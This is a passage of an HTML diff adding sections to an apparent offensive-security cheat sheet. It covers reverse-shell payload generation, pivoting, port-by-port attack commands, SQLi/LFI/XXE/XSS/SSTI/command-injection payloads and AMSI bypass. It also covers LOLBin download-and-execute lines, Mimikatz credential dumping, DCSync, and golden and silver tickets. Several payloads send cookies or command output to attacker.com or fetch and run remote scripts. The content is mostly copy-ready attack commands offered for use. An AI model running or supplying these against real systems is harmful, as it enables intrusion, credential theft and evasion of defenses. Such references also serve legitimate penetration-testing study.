+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o meter.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
+msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php
+msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war</pre></div>
+    </div>
+
+    <!-- ═══ PIVOTING ═══ -->
+    <div id="n-sec-tools-pivot" class="n-section">
+      <div class="n-page-title">🔀 <span class="hl">Pivoting / Forwarding</span></div>
+      <div class="n-page-sub">Tunneling and port forwarding techniques</div>
+      <h2>SSH Tunneling</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>ssh -L 8080:internal:80 user@pivot          <span class="n-cm"># Local forward</span>
+ssh -R 9090:localhost:80 user@attacker      <span class="n-cm"># Remote forward</span>
+ssh -D 1080 -N user@pivot                   <span class="n-cm"># SOCKS proxy</span>
+proxychains nmap -sT -Pn 10.10.10.x</pre></div>
+      <h2>Chisel</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>./chisel server -p 8000 --reverse
+./chisel client 10.10.10.10:8000 R:socks
+./chisel client 10.10.10.10:8000 R:8080:internal:80</pre></div>
+      <h2>ligolo-ng</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>sudo ip tuntap add user root mode tun ligolo && sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+./agent -connect 10.10.10.10:11601 -ignore-cert
+
+<span class="n-cm"># In proxy shell:</span>
+session; start
+sudo ip route add 172.16.1.0/24 dev ligolo</pre></div>
+    </div>
+
+    <!-- ═══ NETWORK ENUM ═══ -->
+    <div id="n-sec-tools-enum" class="n-section">
+      <div class="n-page-title">🔍 <span class="hl">Network Enumeration</span></div>
+      <div class="n-page-sub">Scanning and service discovery</div>
+      <h2>Nmap</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>nmap -sV -sC -oA scan target
+nmap -p- --min-rate 5000 target
+nmap -sU --top-ports 100 target
+nmap --script vuln target
+nmap --script smb-vuln* -p 445 target</pre></div>
+      <h2>Web Enumeration</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+gobuster vhost -u http://target -w subdomains-top1million-5000.txt
+ffuf -w wordlist.txt -u http://target/FUZZ
+feroxbuster -u http://target
+nikto -h http://target</pre></div>
+    </div>
+
+    <!-- ═══ CRACKING ═══ -->
+    <div id="n-sec-tools-crack" class="n-section">
+      <div class="n-page-title">⚒️ <span class="hl">Cracking / Fuzzing</span></div>
+      <div class="n-page-sub">Password cracking and fuzzing techniques</div>
+      <h2>Hashcat</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>hashcat -m 1000 ntlm.txt rockyou.txt          <span class="n-cm"># NTLM</span>
+hashcat -m 0 md5.txt rockyou.txt              <span class="n-cm"># MD5</span>
+hashcat -m 1800 sha512.txt rockyou.txt        <span class="n-cm"># SHA-512crypt</span>
+hashcat -m 13100 kerberoast.txt rockyou.txt   <span class="n-cm"># Kerberoast</span>
+hashcat -m 18200 asrep.txt rockyou.txt        <span class="n-cm"># AS-REP</span>
+hashcat -a 3 hash.txt ?u?l?l?l?d?d           <span class="n-cm"># Mask attack</span></pre></div>
+      <h2>John the Ripper</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john hash.txt --rules --wordlist=rockyou.txt
+ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=rockyou.txt
+zip2john file.zip > zip.hash && john zip.hash --wordlist=rockyou.txt</pre></div>
+    </div>
+
+    <!-- ═══ TCP PORTS ═══ -->
+    <div id="n-sec-tcp-21" class="n-section">
+      <div class="n-page-title">📟 FTP <span class="hl">| Port 21</span></div>
+      <div class="n-page-sub">FTP enumeration and exploitation</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>ftp target                                    <span class="n-cm"># Connect (try anonymous:anonymous)</span>
+nmap -p21 --script ftp-anon,ftp-bounce target
+hydra -l user -P rockyou.txt ftp://target
+wget -r --no-passive ftp://user:pass@target/  <span class="n-cm"># Download all</span></pre></div>
+    </div>
+    <div id="n-sec-tcp-22" class="n-section">
+      <div class="n-page-title">📟 SSH <span class="hl">| Port 22</span></div>
+      <div class="n-page-sub">SSH enumeration and attacks</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>ssh -i id_rsa user@target
+hydra -l user -P rockyou.txt ssh://target
+ssh-keygen -t rsa -b 4096
+cat id_rsa.pub >> ~/.ssh/authorized_keys
+
+<span class="n-cm"># Enumerate algorithms</span>
+nmap -p22 --script ssh2-enum-algos target</pre></div>
+    </div>
+    <div id="n-sec-tcp-25" class="n-section">
+      <div class="n-page-title">📟 SMTP <span class="hl">| Port 25</span></div>
+      <div class="n-page-sub">SMTP enumeration and user discovery</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>nc -nv target 25
+EHLO test
+VRFY root
+EXPN postmaster
+
+smtp-user-enum -M VRFY -U users.txt -t target</pre></div>
+    </div>
+    <div id="n-sec-tcp-53" class="n-section">
+      <div class="n-page-title">📟 DNS <span class="hl">| Port 53</span></div>
+      <div class="n-page-sub">DNS enumeration and zone transfer</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>dig axfr @ns1.target.com target.com
+dnsenum target.com
+dnsrecon -d target.com -t axfr
+nmap -p53 --script dns-brute target</pre></div>
+    </div>
+    <div id="n-sec-tcp-smb" class="n-section">
+      <div class="n-page-title">📟 SMB <span class="hl">| Port 445</span></div>
+      <div class="n-page-sub">SMB enumeration and exploitation</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>smbclient -L \\\\target -N
+smbmap -H target
+crackmapexec smb target -u '' -p ''
+enum4linux -a target
+nmap -p445 --script smb-enum-shares,smb-vuln-ms17-010 target</pre></div>
+    </div>
+    <div id="n-sec-tcp-ldap" class="n-section">
+      <div class="n-page-title">📟 LDAP <span class="hl">| Port 389</span></div>
+      <div class="n-page-sub">LDAP enumeration</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>ldapsearch -x -H ldap://target -b "dc=domain,dc=local"
+ldapsearch -x -H ldap://target -D "cn=user,dc=domain,dc=local" -w pass -b "dc=domain,dc=local" "(objectClass=user)"</pre></div>
+    </div>
+    <div id="n-sec-udp-snmp" class="n-section">
+      <div class="n-page-title">💧 SNMP <span class="hl">| Port 161</span></div>
+      <div class="n-page-sub">SNMP enumeration</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>snmp-check target -c public
+snmpwalk -c public -v1 target
+onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target</pre></div>
+    </div>
+    <div id="n-sec-udp-ipmi" class="n-section">
+      <div class="n-page-title">💧 IPMI <span class="hl">| Port 623</span></div>
+      <div class="n-page-sub">IPMI exploitation — default creds &amp; hash dump</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>use auxiliary/scanner/ipmi/ipmi_dumphashes
+use auxiliary/scanner/ipmi/ipmi_cipher_zero
+ipmitool -I lanplus -H target -U root -P root chassis status</pre></div>
+    </div>
+
+    <!-- ═══ OWASP ═══ -->
+    <div id="n-sec-owasp-sqli" class="n-section">
+      <div class="n-page-title">🪵 OWASP — <span class="hl">SQL Injection</span></div>
+      <div class="n-page-sub">SQL injection detection and exploitation</div>
+      <h2>Manual Testing</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">sql</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password,NULL FROM users--
+' AND SLEEP(5)--     <span class="n-cm"># Time-based blind</span>
+1; DROP TABLE users--</pre></div>
+      <h2>SQLMap</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>sqlmap -u "http://target/?id=1" --dbs
+sqlmap -u "http://target/?id=1" -D dbname --tables
+sqlmap -u "http://target/?id=1" -D dbname -T users --dump
+sqlmap -u "http://target/" --data="user=admin&pass=test" --dbs
+sqlmap -r request.txt --level=5 --risk=3 --batch</pre></div>
+    </div>
+    <div id="n-sec-owasp-lfi" class="n-section">
+      <div class="n-page-title">🪵 OWASP — <span class="hl">LFI / XXE</span></div>
+      <div class="n-page-sub">Local file inclusion and XXE injection</div>
+      <h2>LFI Payloads</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>?file=../../../../etc/passwd
+?file=....//....//etc/passwd          <span class="n-cm"># Filter bypass</span>
+?file=php://filter/read=convert.base64-encode/resource=index.php
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</pre></div>
+      <h2>XXE</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">xml</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</pre></div>
+    </div>
+    <div id="n-sec-owasp-xss" class="n-section">
+      <div class="n-page-title">🪵 OWASP — <span class="hl">XSS / SSTI</span></div>
+      <div class="n-page-sub">Cross-site scripting and server-side template injection</div>
+      <h2>XSS Payloads</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">javascript</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</pre></div>
+      <h2>SSTI</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>{{7*7}}    <span class="n-cm"># Jinja2 → 49</span>
+${7*7}     <span class="n-cm"># FreeMarker</span>
+
+<span class="n-cm"># Jinja2 RCE</span>
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}</pre></div>
+    </div>
+    <div id="n-sec-owasp-cmd" class="n-section">
+      <div class="n-page-title">🪵 OWASP — <span class="hl">Command Injection</span></div>
+      <div class="n-page-sub">OS command injection detection and exploitation</div>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>; id     && id     || id     | id     `id`     $(id)
+
+<span class="n-cm"># Blind time-based</span>
+; sleep 5
+& ping -c 5 127.0.0.1 &
+
+<span class="n-cm"># OOB</span>
+; curl http://attacker.com/`whoami`
+
+<span class="n-cm"># Filter bypass</span>
+c$@t /etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}</pre></div>
+    </div>
+
+    <!-- ═══ DATABASE ═══ -->
+    <div id="n-sec-db-mssql" class="n-section">
+      <div class="n-page-title">🎛️ <span class="hl">MSSQL / MySQL / PostgreSQL</span></div>
+      <div class="n-page-sub">Database interaction and exploitation</div>
+      <h2>MSSQL</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>impacket-mssqlclient user:pass@target
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</pre></div>
+      <h2>MySQL</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>mysql -u root -p -h target
+SELECT user,password FROM mysql.user;
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--</pre></div>
+      <h2>PostgreSQL</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>psql -U postgres -h target
+\l; \c dbname; \dt
+COPY cmd_output FROM PROGRAM 'id';
+SELECT * FROM cmd_output;</pre></div>
+    </div>
+
+    <!-- ═══ RECON ═══ -->
+    <div id="n-sec-other-recon" class="n-section">
+      <div class="n-page-title">🍎 Red Team — <span class="hl">Reconnaissance</span></div>
+      <div class="n-page-sub">Passive and active information gathering</div>
+      <h2>Passive Recon</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>whois target.com
+theHarvester -d target.com -b google,linkedin,bing,shodan
+curl "https://crt.sh/?q=%.target.com&output=json" | jq .[].name_value
+
+<span class="n-cm"># Google Dorks</span>
+site:target.com filetype:pdf
+site:target.com inurl:admin
+"@target.com" filetype:xls
+intitle:"index of" site:target.com</pre></div>
+      <h2>Active Recon</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>subfinder -d target.com -o subs.txt
+amass enum -d target.com
+masscan -p1-65535 target --rate=10000
+whatweb http://target.com</pre></div>
+    </div>
+
+    <!-- ═══ AV EVASION ═══ -->
+    <div id="n-sec-other-av" class="n-section">
+      <div class="n-page-title">🍎 Red Team — <span class="hl">AV Evasion</span></div>
+      <div class="n-page-sub">Bypassing antivirus and EDR solutions</div>
+      <h2>PowerShell Obfuscation</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">powershell</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Base64 encode</span>
+$cmd='IEX(New-Object Net.WebClient).DownloadString("http://IP/shell.ps1")'
+$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell -enc $enc
+
+<span class="n-cm"># AMSI bypass</span>
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</pre></div>
+      <h2>Shellcode Loaders</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">bash</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Veil Framework</span>
+veil -t Evasion -p powershell/meterpreter/rev_tcp
+
+<span class="n-cm"># Donut — shellcode from .NET</span>
+donut -f payload.exe -o shellcode.bin
+
+<span class="n-cm"># Sliver C2 (alternative to Cobalt Strike)</span>
+sliver-server
+generate --mtls 10.10.10.10:443 --os windows --save payload.exe</pre></div>
+    </div>
+
+    <!-- ═══ LOLBINS ═══ -->
+    <div id="n-sec-other-lolbins" class="n-section">
+      <div class="n-page-title">🍎 Red Team — <span class="hl">LOLBins</span></div>
+      <div class="n-page-sub">Living Off the Land Binaries — abuse trusted system binaries</div>
+      <div class="n-info-box tip"><strong>💡 What are LOLBins?</strong>Native OS binaries that can be abused for execution, download, or bypass. Useful for defense evasion as they are trusted and often whitelisted.</div>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Binary</th><th>Use</th><th>Example</th></tr>
+        <tr><td><code>certutil</code></td><td>Download &amp; encode/decode</td><td><code>certutil -urlcache -f http://IP/file.exe .</code></td></tr>
+        <tr><td><code>regsvr32</code></td><td>Execute COM scriptlets</td><td><code>regsvr32 /s /n /u /i:http://IP/shell.sct scrobj.dll</code></td></tr>
+        <tr><td><code>mshta</code></td><td>Execute HTA payloads</td><td><code>mshta http://IP/payload.hta</code></td></tr>
+        <tr><td><code>rundll32</code></td><td>Execute DLLs/JS</td><td><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"</code></td></tr>
+        <tr><td><code>msiexec</code></td><td>Install MSI silently</td><td><code>msiexec /quiet /i http://IP/evil.msi</code></td></tr>
+        <tr><td><code>wscript</code></td><td>Run JS/VBS payloads</td><td><code>wscript payload.vbs</code></td></tr>
+        <tr><td><code>bitsadmin</code></td><td>Background file download</td><td><code>bitsadmin /transfer job http://IP/file C:\file</code></td></tr>
+        <tr><td><code>forfiles</code></td><td>Execute per-file</td><td><code>forfiles /p c:\windows\system32 /m notepad.exe /c cmd.exe</code></td></tr>
+      </table></div>
+    </div>
+
+    <!-- ═══ EXTRA: MIMIKATZ ═══ -->
+    <div id="n-sec-extra-mimikatz" class="n-section">
+      <div class="n-copyright-strip"><span>🔑</span><span><strong>© Darckshad4w</strong> — Extra Notes: Mimikatz Cheatsheet</span></div>
+      <div class="n-page-title">🔑 <span class="hl">Mimikatz</span> Cheatsheet</div>
+      <div class="n-page-sub">Complete Mimikatz reference for credential dumping and token manipulation</div>
+      <div class="n-info-box warn"><strong>⚠️ Requires Admin / SYSTEM</strong>Most Mimikatz commands require SeDebugPrivilege. Always run privilege::debug first and verify it succeeds.</div>
+      <h2>Initial Setup</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">mimikatz</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>privilege::debug              <span class="n-cm"># Enable SeDebugPrivilege (must say OK)</span>
+version                       <span class="n-cm"># Check version</span>
+log mimikatz.log              <span class="n-cm"># Log all output to file</span>
+log                           <span class="n-cm"># Stop logging</span></pre></div>
+      <h2>Logon Passwords (sekurlsa)</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">mimikatz</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>sekurlsa::logonpasswords       <span class="n-cm"># Dump all logged-on user passwords / hashes</span>
+sekurlsa::wdigest              <span class="n-cm"># WDigest plaintext (if enabled)</span>
+sekurlsa::msv                  <span class="n-cm"># MSV hashes (NTLM)</span>
+sekurlsa::kerberos             <span class="n-cm"># Kerberos credentials</span>
+sekurlsa::tspkg                <span class="n-cm"># TsPkg credentials</span>
+sekurlsa::livessp              <span class="n-cm"># LiveSSP (MS account)</span>
+sekurlsa::dpapi                <span class="n-cm"># Master keys</span>
+
+<span class="n-cm"># Pass-the-Hash with sekurlsa</span>
+sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd.exe</pre></div>
+      <h2>SAM &amp; LSA Dump</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">mimikatz</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>lsadump::sam                   <span class="n-cm"># Local SAM database NTLM hashes</span>
+lsadump::sam /patch            <span class="n-cm"># With patch bypass</span>
+lsadump::lsa /patch            <span class="n-cm"># LSA secrets</span>
+lsadump::secrets               <span class="n-cm"># All LSA secrets</span>
+lsadump::cache                 <span class="n-cm"># Domain cached credentials (DCC2)</span></pre></div>
+      <h2>DCSync</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">mimikatz</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>lsadump::dcsync /user:krbtgt   <span class="n-cm"># Sync krbtgt hash (Golden Ticket)</span>
+lsadump::dcsync /user:Administrator
+lsadump::dcsync /all /csv      <span class="n-cm"># Dump ALL domain hashes</span></pre></div>
+      <h2>Kerberos Tickets</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">mimikatz</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>kerberos::list                 <span class="n-cm"># List all Kerberos tickets</span>
+kerberos::list /export         <span class="n-cm"># Export to .kirbi files</span>
+kerberos::ptt ticket.kirbi     <span class="n-cm"># Pass-the-Ticket (inject)</span>
+kerberos::purge                <span class="n-cm"># Delete all tickets</span>
+
+<span class="n-cm"># Golden Ticket</span>
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500
+
+<span class="n-cm"># Silver Ticket</span>
+kerberos::golden /user:user /domain:corp.local /sid:SID /target:server /service:cifs /rc4:HASH</pre></div>
+      <h2>Token Manipulation</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">mimikatz</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>token::whoami                  <span class="n-cm"># Current token info</span>
+token::list                    <span class="n-cm"># List available tokens</span>
+token::elevate                 <span class="n-cm"># Elevate to SYSTEM</span>
+token::elevate /domainadmin    <span class="n-cm"># Impersonate domain admin token</span>
+token::revert                  <span class="n-cm"># Revert to original token</span></pre></div>
+      <h2>Remote / One-liner Usage</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">cmd</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre><span class="n-cm"># Inline command</span>
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+<span class="n-cm"># PowerShell (in-memory, no disk touch)</span>
+IEX (New-Object Net.WebClient).DownloadString('http://IP/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
+
+<span class="n-cm"># Via CrackMapExec</span>
+crackmapexec smb target -u admin -p pass -M mimikatz</pre></div>
+    </div>
+
+    <!-- ═══ EXTRA: BURP ═══ -->
+    <div id="n-sec-extra-burp" class="n-section">
+      <div class="n-copyright-strip"><span>🔍</span><span><strong>© Darckshad4w</strong> — Extra Notes: Burp Suite Pro Tips</span></div>
+      <div class="n-page-title">🔍 Burp Suite <span class="hl">Pro Tips</span></div>
+      <div class="n-page-sub">Advanced Burp Suite techniques for web application testing</div>
+      <h2>Key Shortcuts</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Shortcut</th><th>Action</th></tr>
+        <tr><td><code>Ctrl+R</code></td><td>Send to Repeater</td></tr>
+        <tr><td><code>Ctrl+I</code></td><td>Send to Intruder</td></tr>
+        <tr><td><code>Ctrl+S</code></td><td>Send to Scanner</td></tr>
+        <tr><td><code>Ctrl+F</code></td><td>Forward request (Intercept)</td></tr>
+        <tr><td><code>Ctrl+Shift+I</code></td><td>Intercept ON/OFF</td></tr>
+        <tr><td><code>Ctrl+U</code></td><td>URL-encode selection</td></tr>
+        <tr><td><code>Ctrl+Shift+U</code></td><td>URL-decode selection</td></tr>
+        <tr><td><code>Ctrl+B</code></td><td>Base64 encode</td></tr>
+        <tr><td><code>Ctrl+Shift+B</code></td><td>Base64 decode</td></tr>
+      </table></div>
+      <h2>Intruder Attack Types</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Type</th><th>Use Case</th></tr>
+        <tr><td><code>Sniper</code></td><td>Single payload position, iterate wordlist — best for brute-force</td></tr>
+        <tr><td><code>Battering Ram</code></td><td>Same payload in all positions — useful for username=password</td></tr>
+        <tr><td><code>Pitchfork</code></td><td>Multiple wordlists, one per position, in parallel — credential stuffing</td></tr>
+        <tr><td><code>Cluster Bomb</code></td><td>All combinations of multiple wordlists — thorough brute-force</td></tr>
+      </table></div>
+      <h2>Useful Extensions</h2>
+      <div class="n-tbl-wrap"><table>
+        <tr><th>Extension</th><th>Purpose</th></tr>
+        <tr><td><code>Turbo Intruder</code></td><td>High-speed Intruder using Python scripts — great for race conditions</td></tr>
+        <tr><td><code>Autorize</code></td><td>Automated IDOR / privilege escalation testing</td></tr>
+        <tr><td><code>Active Scan++</code></td><td>Enhanced active scanner checks</td></tr>
+        <tr><td><code>Logger++</code></td><td>Advanced request logging with filters</td></tr>
+        <tr><td><code>JWT Editor</code></td><td>JWT token manipulation and attacks</td></tr>
+        <tr><td><code>Param Miner</code></td><td>Discover hidden/undocumented parameters</td></tr>
+        <tr><td><code>Hackvertor</code></td><td>On-the-fly payload encoding/decoding</td></tr>
+        <tr><td><code>CSRF Scanner</code></td><td>Automated CSRF detection</td></tr>
+      </table></div>
+      <h2>Turbo Intruder — Race Condition</h2>
+      <div class="n-code-block"><div class="n-code-header"><div class="n-code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="n-code-lang">python</span><div class="n-code-header-right"><button class="n-copy-btn" onclick="nCopyCode(this)">copy</button></div></div><pre>def queueRequests(target, wordlists):
